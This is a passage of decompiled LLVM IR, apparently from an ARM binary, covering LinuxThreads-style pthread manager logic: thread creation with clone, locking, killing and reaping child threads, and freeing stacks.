  br i1 %v2_b550, label %dec_label_pc_b5e4, label %dec_label_pc_b584

dec_label_pc_b584:                                ; preds = %dec_label_pc_b4d8
  %v0_b584 = load i32, i32* %sl.global-to-local, align 4
  %v1_b584 = inttoptr i32 %v0_b584 to i32*
  %v2_b584 = load i32, i32* %v1_b584, align 4
  store i32 %v2_b584, i32* %r3.global-to-local, align 4
  %v1_b588 = trunc i32 %v2_b584 to i8
  %v2_b588 = load i32, i32* @r8, align 4
  %v3_b588 = add i32 %v2_b588, 45
  %v4_b588 = inttoptr i32 %v3_b588 to i8*
  store i8 %v1_b588, i8* %v4_b588, align 1
  %v0_b58c = load i32, i32* %sl.global-to-local, align 4
  %v1_b58c = add i32 %v0_b58c, 24
  %v2_b58c = inttoptr i32 %v1_b58c to i32*
  %v3_b58c = load i32, i32* %v2_b58c, align 4
  store i32 %v3_b58c, i32* %r3.global-to-local, align 4
  %v1_b590 = load i32, i32* @r8, align 4
  %v2_b590 = add i32 %v1_b590, 392
  %v3_b590 = inttoptr i32 %v2_b590 to i32*
  store i32 %v3_b58c, i32* %v3_b590, align 4
  %v0_b594 = load i32, i32* %sl.global-to-local, align 4
  %v1_b594 = add i32 %v0_b594, 12
  %v2_b594 = inttoptr i32 %v1_b594 to i32*
  %v3_b594 = load i32, i32* %v2_b594, align 4
  store i32 %v3_b594, i32* %r3.global-to-local, align 4
  %v1_b598 = load i32, i32* %r1.global-to-local, align 4
  %v9_b598 = icmp eq i32 %v3_b594, %v1_b598
  store i1 %v9_b598, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b598, label %dec_label_pc_b5c4, label %dec_label_pc_b5a0

dec_label_pc_b5a0:                                ; preds = %dec_label_pc_b584
  %v7_b5a0 = icmp eq i32 %v3_b594, 1
  store i1 %v7_b5a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b5a0, label %dec_label_pc_b5a8, label %dec_label_pc_b5dc

dec_label_pc_b5a8:                                ; preds = %dec_label_pc_b5a0
  %v1_b5a8 = add i32 %v0_b594, 4
  %v2_b5a8 = inttoptr i32 %v1_b5a8 to i32*
  %v3_b5a8 = load i32, i32* %v2_b5a8, align 4
  store i32 %v3_b5a8, i32* %r3.global-to-local, align 4
  %v0_b5ac = load i32, i32* @r8, align 4
  %v1_b5ac = add i32 %v0_b5ac, 232
  store i32 %v1_b5ac, i32* @r0, align 4
  %v2_b5b0 = add i32 %v0_b5ac, 228
  %v3_b5b0 = inttoptr i32 %v2_b5b0 to i32*
  store i32 %v3_b5a8, i32* %v3_b5b0, align 4
  %v0_b5b4 = load i32, i32* %sl.global-to-local, align 4
  %v1_b5b4 = add i32 %v0_b5b4, 8
  store i32 %v1_b5b4, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_b5bc = call i32 @memcpy()
  store i32 %v0_b5bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b5dc

dec_label_pc_b5c4:                                ; preds = %dec_label_pc_b584
  store i32 %v3_b348, i32* %r0.global-to-local, align 4
  %v0_b5c8 = call i32 @sched_getscheduler()
  %v0_b5cc = load i32, i32* @r8, align 4
  %v1_b5cc = add i32 %v0_b5cc, 232
  store i32 %v1_b5cc, i32* %r1.global-to-local, align 4
  %v2_b5d0 = add i32 %v0_b5cc, 228
  %v3_b5d0 = inttoptr i32 %v2_b5d0 to i32*
  store i32 %v0_b5c8, i32* %v3_b5d0, align 4
  store i32 %v3_b348, i32* %r0.global-to-local, align 4
  %v0_b5d8 = call i32 @sched_getparam()
  store i32 %v0_b5d8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b5dc

dec_label_pc_b5dc:                                ; preds = %dec_label_pc_b5a0, %dec_label_pc_b5a8, %dec_label_pc_b5c4
  %v0_b5dc = load i32, i32* @r8, align 4
  %v1_b5dc = add i32 %v0_b5dc, 232
  %v2_b5dc = inttoptr i32 %v1_b5dc to i32*
  %v3_b5dc = load i32, i32* %v2_b5dc, align 4
  store i32 %v3_b5dc, i32* %r3.global-to-local, align 4
  %v2_b5e0 = add i32 %v0_b5dc, 24
  %v3_b5e0 = inttoptr i32 %v2_b5e0 to i32*
  store i32 %v3_b5dc, i32* %v3_b5e0, align 4
  br label %dec_label_pc_b5e4

dec_label_pc_b5e4:                                ; preds = %dec_label_pc_b4d8, %dec_label_pc_b5dc
  store i32 %tmp46, i32* %r2.global-to-local, align 4
  %v1_b5ec = load i32, i32* @r8, align 4
  %v2_b5ec = add i32 %v1_b5ec, 92
  %v3_b5ec = inttoptr i32 %v2_b5ec to i32*
  store i32 %tmp55, i32* %v3_b5ec, align 4
  %v0_b5f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_b5f0 = load i32, i32* @r8, align 4
  %v2_b5f0 = add i32 %v1_b5f0, 96
  %v3_b5f0 = inttoptr i32 %v2_b5f0 to i32*
  store i32 %v0_b5f0, i32* %v3_b5f0, align 4
  store i32 %v2_b5f4, i32* @r1, align 4
  store i32 128, i32* @r2, align 4
  %v0_b5fc = load i32, i32* @r8, align 4
  %v1_b5fc = add i32 %v0_b5fc, 100
  store i32 %v1_b5fc, i32* @r0, align 4
  %v0_b600 = call i32 @memcpy()
  store i32 %v0_b600, i32* %r0.global-to-local, align 4
  %v0_b604 = load i32, i32* @r8, align 4
  %v1_b604 = add i32 %v0_b604, 24
  %v2_b604 = inttoptr i32 %v1_b604 to i32*
  %v3_b604 = load i32, i32* %v2_b604, align 4
  store i32 %v3_b604, i32* %r0.global-to-local, align 4
  %v1_b608 = call i32 @__pthread_manager_adjust_prio(i32 %v3_b604)
  store i32 %v1_b608, i32* %r0.global-to-local, align 4
  %v2_b610 = load i32, i32* bitcast (i32** @global_var_2a7a0.197 to i32*), align 4
  store i32 %v2_b610, i32* %r2.global-to-local, align 4
  %v1_b618 = load i32, i32* @r8, align 4
  %v2_b618 = inttoptr i32 %v1_b618 to i32*
  store i32 %v2_b610, i32* %v2_b618, align 4
  store i32 %v3_b34c, i32* %ip.global-to-local, align 4
  %v2_b620 = load i32, i32* bitcast (i32** @global_var_2a7a0.197 to i32*), align 4
  store i32 %v2_b620, i32* %r3.global-to-local, align 4
  %v2_b624 = icmp eq i32 %v3_b34c, 0
  store i1 %v2_b624, i1* %cpsr_z.global-to-local, align 1
  %v0_b628 = load i32, i32* %r2.global-to-local, align 4
  %v1_b628 = load i32, i32* @r8, align 4
  %v2_b628 = add i32 %v1_b628, 4
  %v3_b628 = inttoptr i32 %v2_b628 to i32*
  store i32 %v0_b628, i32* %v3_b628, align 4
  %v0_b62c = load i32, i32* @r8, align 4
  %v1_b62c = load i32, i32* %r2.global-to-local, align 4
  %v2_b62c = inttoptr i32 %v1_b62c to i32*
  store i32 %v0_b62c, i32* %v2_b62c, align 4
  %v0_b630 = load i32, i32* @r8, align 4
  store i32 %v0_b630, i32* @global_var_2a7a4.195, align 4
  br i1 %v2_b624, label %dec_label_pc_b6b4, label %dec_label_pc_b638

dec_label_pc_b638:                                ; preds = %dec_label_pc_b5e4
  store i32 %v3_b328, i32* %r1.global-to-local, align 4
  %v2_b640 = load i32, i32* @global_var_2f55c.213, align 4
  store i32 %v2_b640, i32* %r3.global-to-local, align 4
  %v1_b644 = add i32 %v3_b328, 416
  %v2_b644 = inttoptr i32 %v1_b644 to i32*
  %v3_b644 = load i32, i32* %v2_b644, align 4
  store i32 %v3_b644, i32* %r2.global-to-local, align 4
  %v2_b648 = or i32 %v3_b644, %v2_b640
  store i32 %v2_b648, i32* %r3.global-to-local, align 4
  %v1_b64c = and i32 %v2_b648, 128
  %v2_b64c = icmp eq i32 %v1_b64c, 0
  store i1 %v2_b64c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b64c, label %dec_label_pc_b6b4, label %dec_label_pc_b654

dec_label_pc_b654:                                ; preds = %dec_label_pc_b638
  %v1_b654 = add i32 %v0_b630, 28
  %v2_b654 = inttoptr i32 %v1_b654 to i32*
  %v3_b654 = load i32, i32* %v2_b654, align 4
  store i32 %v3_b654, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_b65c = call i32 @__pthread_lock(i32 %v3_b654, i32 0)
  %v2_b664 = load i32, i32* @global_var_2a7ac.224, align 4
  store i32 ptrtoint (i32* @global_var_af9c.247 to i32), i32* %r0.global-to-local, align 4
  %v1_b66c = or i32 %v2_b664, 3840
  store i32 %v1_b66c, i32* @r2, align 4
  %v0_b670 = load i32, i32* @r8, align 4
  store i32 %v0_b670, i32* %r1.global-to-local, align 4
  store i32 %v0_b670, i32* @r3, align 4
  %v2_b678 = call i32 @clone(i32 ptrtoint (i32* @global_var_af9c.247 to i32), i32 %v0_b670)
  store i32 %v2_b678, i32* @r0, align 4
  %v7_b67c = icmp eq i32 %v2_b678, -1
  store i1 %v7_b67c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_b678, i32* @r4, align 4
  br i1 %v7_b67c, label %dec_label_pc_b6ac, label %dec_label_pc_b688

dec_label_pc_b688:                                ; preds = %dec_label_pc_b654
  %v1_b68c = load i32, i32* @r8, align 4
  %v2_b68c = add i32 %v1_b68c, 424
  %v3_b68c = inttoptr i32 %v2_b68c to i32*
  store i32 8, i32* %v3_b68c, align 4
  store i32 ptrtoint (i32* @global_var_2f564.215 to i32), i32* %r3.global-to-local, align 4
  %v1_b694 = load i32, i32* @r8, align 4
  %v2_b694 = add i32 %v1_b694, 20
  %v3_b694 = inttoptr i32 %v2_b694 to i32*
  store i32 %v2_b678, i32* %v3_b694, align 4
  %v0_b698 = load i32, i32* @r8, align 4
  %v2_b698 = add i32 %v0_b698, 428
  %v3_b698 = inttoptr i32 %v2_b698 to i32*
  store i32 %v0_b698, i32* %v3_b698, align 4
  %v0_b69c = load i32, i32* @r8, align 4
  %v1_b69c = load i32, i32* %r3.global-to-local, align 4
  %v2_b69c = inttoptr i32 %v1_b69c to i32*
  store i32 %v0_b69c, i32* %v2_b69c, align 4
  %v0_b6a0 = call i32 @__linuxthreads_create_event()
  store i32 %v0_b6a0, i32* %r0.global-to-local, align 4
  %v0_b6a4 = load i32, i32* @r8, align 4
  %v1_b6a4 = add i32 %v0_b6a4, 28
  %v2_b6a4 = inttoptr i32 %v1_b6a4 to i32*
  %v3_b6a4 = load i32, i32* %v2_b6a4, align 4
  store i32 %v3_b6a4, i32* %r0.global-to-local, align 4
  %v1_b6a8 = call i32 @__pthread_unlock(i32 %v3_b6a4)
  store i32 %v1_b6a8, i32* %r0.global-to-local, align 4
  %v0_b6ac.pr = load i32, i32* @r4, align 4
  br label %dec_label_pc_b6ac

dec_label_pc_b6ac:                                ; preds = %dec_label_pc_b654, %dec_label_pc_b688
  %v0_b6d4.pr = phi i32 [ %v2_b678, %dec_label_pc_b654 ], [ %v0_b6ac.pr, %dec_label_pc_b688 ]
  %v2_b6ac = icmp eq i32 %v0_b6d4.pr, 0
  store i1 %v2_b6ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b6ac, label %dec_label_pc_b6ac.dec_label_pc_b6b4_crit_edge, label %dec_label_pc_b6d4

dec_label_pc_b6ac.dec_label_pc_b6b4_crit_edge:    ; preds = %dec_label_pc_b6ac
  %v0_b6c4.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_b6b4

dec_label_pc_b6b4:                                ; preds = %dec_label_pc_b6ac.dec_label_pc_b6b4_crit_edge, %dec_label_pc_b638, %dec_label_pc_b5e4
  %v0_b6c4 = phi i32 [ %v0_b6c4.pre, %dec_label_pc_b6ac.dec_label_pc_b6b4_crit_edge ], [ %v0_b630, %dec_label_pc_b638 ], [ %v0_b630, %dec_label_pc_b5e4 ]
  %v2_b6b8 = load i32, i32* @global_var_2a7ac.224, align 4
  store i32 ptrtoint (i32* @global_var_aec0.250 to i32), i32* %r0.global-to-local, align 4
  %v1_b6c0 = or i32 %v2_b6b8, 3840
  store i32 %v1_b6c0, i32* @r2, align 4
  store i32 %v0_b6c4, i32* %r1.global-to-local, align 4
  store i32 %v0_b6c4, i32* @r3, align 4
  %v2_b6cc = call i32 @clone(i32 ptrtoint (i32* @global_var_aec0.250 to i32), i32 %v0_b6c4)
  store i32 %v2_b6cc, i32* %r0.global-to-local, align 4
  store i32 %v2_b6cc, i32* @r4, align 4
  br label %dec_label_pc_b6d4

dec_label_pc_b6d4:                                ; preds = %dec_label_pc_b6ac, %dec_label_pc_b6b4
  %v0_b770 = phi i32 [ %v2_b6cc, %dec_label_pc_b6b4 ], [ %v0_b6d4.pr, %dec_label_pc_b6ac ]
  %v3_b6d4 = icmp eq i32 %v0_b770, -1
  %v8_b6d4 = icmp eq i32 %v0_b770, -1
  store i1 %v8_b6d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_b6d4, label %dec_label_pc_b6dc, label %dec_label_pc_b768

dec_label_pc_b6dc:                                ; preds = %dec_label_pc_b6d4
  %v0_b6dc = load i32, i32* @r8, align 4
  %v1_b6dc = inttoptr i32 %v0_b6dc to i32*
  %v2_b6dc = load i32, i32* %v1_b6dc, align 4
  store i32 %v2_b6dc, i32* %r3.global-to-local, align 4
  %v1_b6e0 = add i32 %v0_b6dc, 4
  %v2_b6e0 = inttoptr i32 %v1_b6e0 to i32*
  %v3_b6e0 = load i32, i32* %v2_b6e0, align 4
  store i32 %v3_b6e0, i32* %r2.global-to-local, align 4
  %v2_b6e4 = add i32 %v2_b6dc, 4
  %v3_b6e4 = inttoptr i32 %v2_b6e4 to i32*
  store i32 %v3_b6e0, i32* %v3_b6e4, align 4
  %v0_b6e8 = load i32, i32* @r8, align 4
  %v1_b6e8 = add i32 %v0_b6e8, 4
  %v2_b6e8 = inttoptr i32 %v1_b6e8 to i32*
  %v3_b6e8 = load i32, i32* %v2_b6e8, align 4
  store i32 %v3_b6e8, i32* %r2.global-to-local, align 4
  %v0_b6ec = load i32, i32* %sl.global-to-local, align 4
  %v2_b6ec = icmp eq i32 %v0_b6ec, 0
  store i1 %v2_b6ec, i1* %cpsr_z.global-to-local, align 1
  %v0_b6f0 = load i32, i32* %r3.global-to-local, align 4
  %v2_b6f0 = inttoptr i32 %v3_b6e8 to i32*
  store i32 %v0_b6f0, i32* %v2_b6f0, align 4
  br i1 %v2_b6ec, label %dec_label_pc_b704, label %dec_label_pc_b6f8

dec_label_pc_b6f8:                                ; preds = %dec_label_pc_b6dc
  %v0_b6f8 = load i32, i32* %sl.global-to-local, align 4
  %v1_b6f8 = add i32 %v0_b6f8, 24
  %v2_b6f8 = inttoptr i32 %v1_b6f8 to i32*
  %v3_b6f8 = load i32, i32* %v2_b6f8, align 4
  store i32 %v3_b6f8, i32* %r3.global-to-local, align 4
  %v2_b6fc = icmp eq i32 %v3_b6f8, 0
  store i1 %v2_b6fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b6fc, label %dec_label_pc_b704, label %dec_label_pc_b72c

dec_label_pc_b704:                                ; preds = %dec_label_pc_b6f8, %dec_label_pc_b6dc
  %v0_b704 = load i32, i32* @r8, align 4
  %v1_b704 = add i32 %v0_b704, 400
  %v2_b704 = inttoptr i32 %v1_b704 to i32*
  %v3_b704 = load i32, i32* %v2_b704, align 4
  store i32 %v3_b704, i32* %r1.global-to-local, align 4
  %v2_b708 = icmp eq i32 %v3_b704, 0
  store i1 %v2_b708, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b708, label %bb66, label %bb65

bb65:                                             ; preds = %dec_label_pc_b704
  %v2_b70c = add i32 %v0_b704, 396
  %v3_b70c = inttoptr i32 %v2_b70c to i32*
  %v4_b70c = load i32, i32* %v3_b70c, align 4
  store i32 %v4_b70c, i32* %r0.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_b704, %bb65
  %v1_b710 = xor i1 %v2_b708, true
  call void @__pseudo_cond_branch(i1 %v1_b710, i32 ptrtoint (i32* @global_var_103d4.209 to i32))
  store i32 ptrtoint (i32* @global_var_2f3e8.239 to i32), i32* %r3.global-to-local, align 4
  %v2_b718 = load i32, i32* @global_var_2f3e8.239, align 4
  %v3_b71c = mul i32 %v2_b718, 4
  store i32 %v3_b71c, i32* %r1.global-to-local, align 4
  %v1_b720 = load i32, i32* @r8, align 4
  %v2_b720 = sub i32 480, %v3_b71c
  %v1_b724 = add i32 %v2_b720, %v1_b720
  store i32 %v1_b724, i32* %r0.global-to-local, align 4
  %v0_b728 = call i32 @munmap()
  store i32 %v0_b728, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b72c

dec_label_pc_b72c:                                ; preds = %dec_label_pc_b6f8, %bb66
  store i32 ptrtoint (i32* @global_var_2a3c0.207 to i32), i32* %r0.global-to-local, align 4
  store i32 %v1_b3a0, i32* %ip.global-to-local, align 4
  %v2_b734 = load i32, i32* @global_var_2a3c0.207, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v5_b3a0, i32* %r3.global-to-local, align 4
  %v1_b744 = add i32 %v2_b734, -1
  store i32 %v1_b744, i32* %r2.global-to-local, align 4
  %v2_b748 = add i32 %v4_b3a0, add (i32 ptrtoint (i32* @global_var_263c0.205 to i32), i32 12)
  %v3_b748 = inttoptr i32 %v2_b748 to i32*
  store i32 0, i32* %v3_b748, align 4
  %v0_b74c = load i32, i32* %r2.global-to-local, align 4
  %v1_b74c = load i32, i32* %r0.global-to-local, align 4
  %v2_b74c = inttoptr i32 %v1_b74c to i32*
  store i32 %v0_b74c, i32* %v2_b74c, align 4
  %v0_b750 = load i32, i32* %r1.global-to-local, align 4
  %v1_b750 = load i32, i32* %r3.global-to-local, align 4
  %v2_b750 = add i32 %v1_b750, 8
  %v3_b750 = inttoptr i32 %v2_b750 to i32*
  store i32 %v0_b750, i32* %v3_b750, align 4
  %v0_b754 = call i32 @__errno_location()
  store i32 %v0_b754, i32* %r0.global-to-local, align 4
  %v1_b758 = inttoptr i32 %v0_b754 to i32*
  %v2_b758 = load i32, i32* %v1_b758, align 4
  store i32 %v2_b758, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b77c

dec_label_pc_b760:                                ; preds = %dec_label_pc_b4c8
  store i32 11, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b77c

dec_label_pc_b768:                                ; preds = %dec_label_pc_b6d4
  store i32 %v2_b500, i32* %r2.global-to-local, align 4
  store i32 %v3_b328, i32* %r1.global-to-local, align 4
  %v1_b770 = load i32, i32* @r8, align 4
  %v2_b770 = add i32 %v1_b770, 20
  %v3_b770 = inttoptr i32 %v2_b770 to i32*
  store i32 %v0_b770, i32* %v3_b770, align 4
  %v0_b774 = load i32, i32* %r2.global-to-local, align 4
  %v1_b774 = load i32, i32* %r1.global-to-local, align 4
  %v2_b774 = add i32 %v1_b774, 48
  %v3_b774 = inttoptr i32 %v2_b774 to i32*
  store i32 %v0_b774, i32* %v3_b774, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b77c

dec_label_pc_b77c:                                ; preds = %bb63, %dec_label_pc_b760, %dec_label_pc_b72c, %dec_label_pc_b768
  %v0_b780 = phi i32 [ 1, %bb63 ], [ 11, %dec_label_pc_b760 ], [ %v2_b758, %dec_label_pc_b72c ], [ 0, %dec_label_pc_b768 ]
  store i32 %v3_b328, i32* %r3.global-to-local, align 4
  %v2_b780 = add i32 %v3_b328, 52
  %v3_b780 = inttoptr i32 %v2_b780 to i32*
  store i32 %v0_b780, i32* %v3_b780, align 4
  %v3_b784 = load i32, i32* %stack_var_-284, align 4
  store i32 %v3_b784, i32* @r0, align 4
  br label %dec_label_pc_b890

dec_label_pc_b78c:                                ; preds = %dec_label_pc_b2f0
  store i32 ptrtoint (i32* @global_var_263c0.205 to i32), i32* %r2.global-to-local, align 4
  store i32 %v3_b798, i32* %r3.global-to-local, align 4
  store i32 %v5_b79c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_b7a8 = call i32 @__pthread_lock(i32 %v5_b79c, i32 0)
  store i32 %v2_b7a8, i32* %r0.global-to-local, align 4
  %v0_b7ac = load i32, i32* @r5, align 4
  %v1_b7ac = add i32 %v0_b7ac, 8
  %v2_b7ac = inttoptr i32 %v1_b7ac to i32*
  %v3_b7ac = load i32, i32* %v2_b7ac, align 4
  store i32 %v3_b7ac, i32* @r4, align 4
  %v2_b7b0 = icmp eq i32 %v3_b7ac, 0
  store i1 %v2_b7b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b7b0, label %dec_label_pc_b7ec, label %dec_label_pc_b7b8

dec_label_pc_b7b8:                                ; preds = %dec_label_pc_b78c
  %v1_b7b8 = add i32 %v3_b7ac, 16
  %v2_b7b8 = inttoptr i32 %v1_b7b8 to i32*
  %v3_b7b8 = load i32, i32* %v2_b7b8, align 4
  store i32 %v3_b7b8, i32* %r3.global-to-local, align 4
  %v1_b7bc = load i32, i32* @r6, align 4
  %v9_b7bc = icmp eq i32 %v3_b7b8, %v1_b7bc
  store i1 %v9_b7bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b7bc, label %dec_label_pc_b7c4, label %dec_label_pc_b7ec

dec_label_pc_b7c4:                                ; preds = %dec_label_pc_b7b8
  %v1_b7c4 = add i32 %v3_b7ac, 46
  %v2_b7c4 = inttoptr i32 %v1_b7c4 to i8*
  %v3_b7c4 = load i8, i8* %v2_b7c4, align 1
  %v4_b7c4 = zext i8 %v3_b7c4 to i32
  store i32 %v4_b7c4, i32* %r3.global-to-local, align 4
  %v2_b7c8 = icmp eq i8 %v3_b7c4, 0
  store i1 %v2_b7c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b7c8, label %.thread5, label %dec_label_pc_b7d8

.thread5:                                         ; preds = %dec_label_pc_b7c4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_b7d0 = add i32 %v3_b7ac, 45
  %v5_b7d0 = inttoptr i32 %v4_b7d0 to i8*
  store i8 1, i8* %v5_b7d0, align 1
  %v0_b7d4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_b7ec.pre = load i32, i32* @r5, align 4
  br i1 %v0_b7d4.pr.pr, label %dec_label_pc_b7ec, label %dec_label_pc_b7d8

dec_label_pc_b7d8:                                ; preds = %.thread5, %dec_label_pc_b7c4
  %v0_b7d8 = phi i32 [ %v0_b7ac, %dec_label_pc_b7c4 ], [ %v0_b7ec.pre, %.thread5 ]
  store i32 %v0_b7d8, i32* %r0.global-to-local, align 4
  %v1_b7dc = call i32 @__pthread_unlock(i32 %v0_b7d8)
  %v0_b7e0 = load i32, i32* @r4, align 4
  store i32 %v0_b7e0, i32* %r0.global-to-local, align 4
  %v1_b7e4 = call i32 @pthread_free(i32 %v0_b7e0)
  store i32 %v1_b7e4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b294

dec_label_pc_b7ec:                                ; preds = %.thread5, %dec_label_pc_b7b8, %dec_label_pc_b78c
  %v0_b7ec = phi i32 [ %v0_b7ac, %dec_label_pc_b7b8 ], [ %v0_b7ac, %dec_label_pc_b78c ], [ %v0_b7ec.pre, %.thread5 ]
  store i32 %v0_b7ec, i32* %r0.global-to-local, align 4
  %v1_b7f0 = call i32 @__pthread_unlock(i32 %v0_b7ec)
  store i32 %v1_b7f0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b294

dec_label_pc_b7f8:                                ; preds = %dec_label_pc_b2f0
  store i32 ptrtoint (i32* @global_var_2b178.252 to i32), i32* %r3.global-to-local, align 4
  %v3_b7fc = load i32, i32* %stack_var_-284, align 4
  store i32 %v3_b7fc, i32* @r4, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* @global_var_2b178.252, align 4
  %v1_b808 = inttoptr i32 %v3_b7fc to i32*
  %v2_b808 = load i32, i32* %v1_b808, align 4
  store i32 %v2_b808, i32* @r5, align 4
  store i32 %tmp48, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2b17c.254 to i32), i32* %r3.global-to-local, align 4
  store i32 %tmp48, i32* @global_var_2b17c.254, align 4
  %v9_b83020 = icmp eq i32 %v2_b808, %v3_b7fc
  store i1 %v9_b83020, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b83020, label %dec_label_pc_b854.preheader, label %dec_label_pc_b81c

dec_label_pc_b81c:                                ; preds = %dec_label_pc_b7f8, %dec_label_pc_b81c
  %v0_b820 = phi i32 [ %v2_b82c, %dec_label_pc_b81c ], [ %v2_b808, %dec_label_pc_b7f8 ]
  store i32 ptrtoint (i32* @global_var_2a7ac.224 to i32), i32* %r3.global-to-local, align 4
  %v1_b820 = add i32 %v0_b820, 20
  %v2_b820 = inttoptr i32 %v1_b820 to i32*
  %v3_b820 = load i32, i32* %v2_b820, align 4
  store i32 %v3_b820, i32* %r0.global-to-local, align 4
  %v2_b824 = load i32, i32* @global_var_2a7ac.224, align 4
  store i32 %v2_b824, i32* %r1.global-to-local, align 4
  %v0_b828 = call i32 @kill()
  store i32 %v0_b828, i32* %r0.global-to-local, align 4
  %v0_b82c = load i32, i32* @r5, align 4
  %v1_b82c = inttoptr i32 %v0_b82c to i32*
  %v2_b82c = load i32, i32* %v1_b82c, align 4
  store i32 %v2_b82c, i32* @r5, align 4
  %v1_b830 = load i32, i32* @r4, align 4
  %v9_b830 = icmp eq i32 %v2_b82c, %v1_b830
  store i1 %v9_b830, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b830, label %dec_label_pc_b854.preheader, label %dec_label_pc_b81c

dec_label_pc_b854.preheader:                      ; preds = %dec_label_pc_b81c, %dec_label_pc_b7f8
  %v1_b854.ph = phi i32 [ %v3_b7fc, %dec_label_pc_b7f8 ], [ %v2_b82c, %dec_label_pc_b81c ]
  %storemerge.in81 = inttoptr i32 %v1_b854.ph to i32*
  %storemerge82 = load i32, i32* %storemerge.in81, align 4
  store i32 %storemerge82, i32* @r4, align 4
  %v9_b85490 = icmp eq i32 %storemerge82, %v1_b854.ph
  store i1 %v9_b85490, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b85490, label %dec_label_pc_b85c, label %dec_label_pc_b840

dec_label_pc_b840:                                ; preds = %dec_label_pc_b854.preheader, %dec_label_pc_b840
  %storemerge91 = phi i32 [ %storemerge, %dec_label_pc_b840 ], [ %storemerge82, %dec_label_pc_b854.preheader ]
  %v1_b840 = add i32 %storemerge91, 20
  %v2_b840 = inttoptr i32 %v1_b840 to i32*
  %v3_b840 = load i32, i32* %v2_b840, align 4
  store i32 %v3_b840, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 -2147483648, i32* %r2.global-to-local, align 4
  %v3_b84c = call i32 @waitpid(i32 %v3_b840, i32 0, i32 -2147483648)
  store i32 %v3_b84c, i32* %r0.global-to-local, align 4
  %storemerge.in.in.pre = load i32, i32* @r4, align 4
  %v1_b854.pre = load i32, i32* @r5, align 4
  %storemerge.in = inttoptr i32 %storemerge.in.in.pre to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v9_b854 = icmp eq i32 %storemerge, %v1_b854.pre
  store i1 %v9_b854, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b854, label %dec_label_pc_b85c, label %dec_label_pc_b840

dec_label_pc_b85c:                                ; preds = %dec_label_pc_b840, %dec_label_pc_b854.preheader
  %v1_b854.lcssa = phi i32 [ %v1_b854.ph, %dec_label_pc_b854.preheader ], [ %v1_b854.pre, %dec_label_pc_b840 ]
  store i32 %v1_b854.lcssa, i32* @r0, align 4
  %v1_b860 = call i32 @restart(i32 %v1_b854.lcssa)
  br label %dec_label_pc_b864

dec_label_pc_b864:                                ; preds = %dec_label_pc_b2b4, %dec_label_pc_b85c
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_b868 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_b86c:                                ; preds = %dec_label_pc_b2f0
  store i32 ptrtoint (i32* @global_var_2b034.193 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* @global_var_2b034.193, align 4
  %v0_b878 = call i32 @pthread_reap_children()
  %v2_b880 = load i32, i32* bitcast (i32** @global_var_2a7a0.197 to i32*), align 4
  store i32 %v2_b880, i32* %r3.global-to-local, align 4
  store i32 %v2_b880, i32* @r0, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_b890

dec_label_pc_b890:                                ; preds = %dec_label_pc_b86c, %dec_label_pc_b77c
  %v0_b890 = phi i32 [ %v2_b880, %dec_label_pc_b86c ], [ %v3_b784, %dec_label_pc_b77c ]
  %v1_b890 = call i32 @restart(i32 %v0_b890)
  store i32 %v1_b890, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b294

dec_label_pc_b898:                                ; preds = %dec_label_pc_b2f0
  store i32 %tmp48, i32* %r0.global-to-local, align 4
  %v1_b89c = call i32 @__new_sem_post(i32 %tmp48)
  store i32 %v1_b89c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b294

dec_label_pc_b8a4:                                ; preds = %dec_label_pc_b2f0
  %v2_b8a8 = load i32, i32* @global_var_2f568.200, align 4
  store i32 %v2_b8a8, i32* %r3.global-to-local, align 4
  %v2_b8ac = icmp eq i32 %v2_b8a8, 0
  store i1 %v2_b8ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b8ac, label %dec_label_pc_b294, label %dec_label_pc_b8b4

dec_label_pc_b8b4:                                ; preds = %dec_label_pc_b8a4
  store i32 ptrtoint (i32* @global_var_2a7b0.202 to i32), i32* %r3.global-to-local, align 4
  %v2_b8b8 = load i32, i32* @global_var_2a7b0.202, align 4
  store i32 %v2_b8b8, i32* %r0.global-to-local, align 4
